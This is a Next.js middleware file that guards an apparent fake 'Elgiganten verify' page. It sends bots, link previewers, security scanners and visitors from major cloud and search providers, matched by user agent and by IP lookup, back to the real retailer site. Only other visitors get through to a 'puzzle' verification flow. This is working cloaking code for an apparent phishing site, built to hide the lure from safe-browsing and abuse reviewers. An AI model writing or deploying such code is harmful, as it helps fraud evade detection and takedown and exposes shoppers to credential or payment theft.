// middleware.ts
import { NextResponse, NextRequest } from "next/server";

export const config = {
  // Run only on the verify flow
  matcher: ["/elgiganten/verify/:path*"],
};

/* ========= RUNTIME CONFIG / LOGGING ========= */
const REDIRECT_URL = "https://www.elgiganten.se";
const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0"; // set MW_VERBOSE_LOGS=0 to silence
const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);

/* ========= Provider blocklists (ASN + name/domain snippets) ========= */
const BAD_ASN = new Set<string>([
  // Google
  "AS15169", "AS396982",
  // Cloudflare
  "AS13335",
  // Amazon / AWS
  "AS16509", "AS14618",
  // Microsoft / Azure / Bing
  "AS8075", "AS8068",
  // Meta / Facebook
  "AS32934",
  // Fastly
  "AS54113",
  // Akamai
  "AS20940",

  // >>> Your ISP (for testing) — uncomment if you want to block via ASN as well
  // "AS8708",
]);

const BAD_NAME_SNIPPETS: string[] = [
  "google", "google llc", "google cloud", "googlebot",
  "cloudflare", "cloudflare, inc",
  "amazon", "aws", "amazon.com", "amazon technologies",
  "microsoft", "azure", "bing",
  "meta", "facebook", "facebook inc",
  "fastly",
  "akamai",

  // (optional) extra names for your ISP
  "triple t broadband public company limited",
  "triple t broadband",
  "3bb",
];

/** ─────────────────────────────
 * Add-on blocklists (ASNs + names/domains)
 * ───────────────────────────── */
const EXTRA_BAD_ASN: string[] = [
  "AS15169", "AS396982", "AS36040", "AS19527", "AS139070", "AS36561", "AS43515", "AS16550",
  "AS32934", "AS63293",
  "AS8075", "AS8068", "AS8069", "AS12076", "AS13443", "AS14413", "AS40793",
  "AS16509", "AS14618", "AS7224", "AS19047", "AS36263", "AS8987",
  "AS13335",
  "AS20940", "AS12222", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
  "AS54113",
];

for (const a of EXTRA_BAD_ASN) BAD_ASN.add(a.toUpperCase());

const EXTRA_BAD_NAME_SNIPPETS: string[] = [
  "google", "google llc", "google ireland limited", "google cloud",
  "googlebot", "youtube", "ggc", "1e100.net", "googleusercontent.com", "gvt1.com", "google.com",
  "meta", "meta platforms", "facebook", "facebook inc", "fb.com",
  "instagram", "whatsapp", "oculus", "threads", "meta.com", "facebook.com", "instagram.com",
  "microsoft", "microsoft corporation", "azure", "windows.net", "bing", "msn",
  "microsoft.com", "azure.com", "linkedin", "linkedin corporation", "linkedin.com",
  "amazon", "amazon.com", "amazon technologies", "aws", "amazon web services",
  "amazonaws.com", "cloudfront.net",
  "cloudflare", "cloudflare, inc", "cloudflare.com",
  "akamai", "akamai technologies", "akamai international", "akamaiedge.net",
  "akamaitechnologies.com", "akamai.com", "prolexic",
  "fastly", "fastly, inc", "fastly.com", "fastly.net",
  "linode", "linode, llc", "linode.com",
];

BAD_NAME_SNIPPETS.push(...EXTRA_BAD_NAME_SNIPPETS.map((s) => s.toLowerCase()));

/* ======= Optional ENV-driven extensions (no redeploy code changes) ======= */
// Comma-separated lists are supported, e.g. "AS15169,AS16509"
if (process.env.BLOCKED_ASNS) {
  for (const asn of process.env.BLOCKED_ASNS.split(",")) {
    const v = asn.trim().toUpperCase();
    if (v) BAD_ASN.add(v);
  }
}
if (process.env.BLOCKED_ISP_SUBSTRS) {
  for (const s of process.env.BLOCKED_ISP_SUBSTRS.split(",")) {
    const v = s.trim().toLowerCase();
    if (v) BAD_NAME_SNIPPETS.push(v);
  }
}
// Optional country blocks (two-letter codes, e.g. "A1,A2" for Unknown / Satellite)
const BAD_COUNTRIES = new Set<string>(
  (process.env.BLOCKED_COUNTRY_CODES || "")
    .split(",")
    .map((c) => c.trim().toUpperCase())
    .filter(Boolean),
);

/* ========= Broad bot/crawler UA detection (incl. Vertex) ========= */
const BOT_UA =
  /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;

/* ========= Helpers ========= */
function getClientIp(req: NextRequest): string | null {
  // Respect proxies/CDN headers (Vercel/CF)
  const fwd = req.headers.get("x-forwarded-for");
  if (fwd) {
    const ip = fwd.split(",")[0]?.trim();
    if (ip) return ip;
  }
  const cf = req.headers.get("cf-connecting-ip");
  if (cf) return cf.trim();
  const xr = req.headers.get("x-real-ip");
  if (xr) return xr.trim();
  return null;
}

async function ipinfoLookup(ip: string, token?: string) {
  if (!token) {
    log("No IPINFO_TOKEN; skipping IPinfo.");
    return null;
  }
  const url = `https://api.ipinfo.io/lite/${encodeURIComponent(ip)}?token=${encodeURIComponent(token)}`;
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    log("IPinfo query:", ip);
    const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
    clearTimeout(to);
    if (!res.ok) {
      log("IPinfo non-OK:", res.status, res.statusText);
      return null;
    }
    const json = (await res.json()) as {
      asn?: string;
      as_name?: string;
      as_domain?: string;
      country?: string; // sometimes present
    };
    log("IPinfo response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("IPinfo error:", e);
    return null;
  }
}

function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null) {
  if (!rec) return false;
  const { asn, as_name, as_domain } = rec;

  if (asn && BAD_ASN.has(asn.toUpperCase())) {
    log("Block by ASN:", asn);
    return true;
  }
  const name = (as_name || "").toLowerCase();
  const domain = (as_domain || "").toLowerCase();
  const hit = BAD_NAME_SNIPPETS.find((n) => name.includes(n) || domain.includes(n));
  if (hit) {
    log(`Block by ISP substring: "${hit}" in name="${name}" domain="${domain}"`);
    return true;
  }
  return false;
}

async function maxmindLookup(req: NextRequest, ip: string) {
  // Call internal API (Node runtime) with a tight timeout
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    const url = new URL("/api/isp-lookup", req.nextUrl.origin);
    url.searchParams.set("ip", ip);
    log("MaxMind check:", url.toString());
    const res = await fetch(url.toString(), {
      method: "GET",
      signal: controller.signal,
      headers: { "x-mw": "1" }, // trivial guard
      cache: "no-store",
    });
    clearTimeout(to);
    if (!res.ok) {
      log("MaxMind non-OK:", res.status);
      return null;
    }
    const json = (await res.json()) as { isBad?: boolean; reason?: string; isp?: string; asn?: string };
    log("MaxMind response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("MaxMind error:", e);
    return null;
  }
}

/* ========= Middleware entrypoint (Edge runtime) ========= */
export async function middleware(req: NextRequest) {
  const ua = req.headers.get("user-agent") || "";
  const ip = getClientIp(req);
  log("— MW START —", { path: req.nextUrl.pathname, ip, ua });

  // 0) UA block (bots and previews) **before** any page logic
  if (BOT_UA.test(ua)) {
    log("Block by UA bot signature");
    return NextResponse.redirect(REDIRECT_URL, { status: 302 });
  }

  // 1) IPinfo ASN/AS-name/domain (+ optional country)
  if (ip) {
    const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);

    // Country block (if provided by IPinfo Lite & configured)
    if (lite?.country && BAD_COUNTRIES.has(lite.country.toUpperCase())) {
      log("Block by country code:", lite.country);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    if (matchesBadProviderLite(lite)) {
      log("Redirect (IPinfo match) →", REDIRECT_URL);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    // 2) MaxMind ISP DB as a second signal (if you wired /api/isp-lookup)
    const mm = await maxmindLookup(req, ip);
    if (mm?.isBad) {
      log("Redirect (MaxMind match) →", REDIRECT_URL);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }
  } else {
    log("No client IP found; skipping IP-based checks");
  }

  // 3) Allow through to the verify page flow (puzzle etc.)
  log("Allow through");
  return NextResponse.next();
}
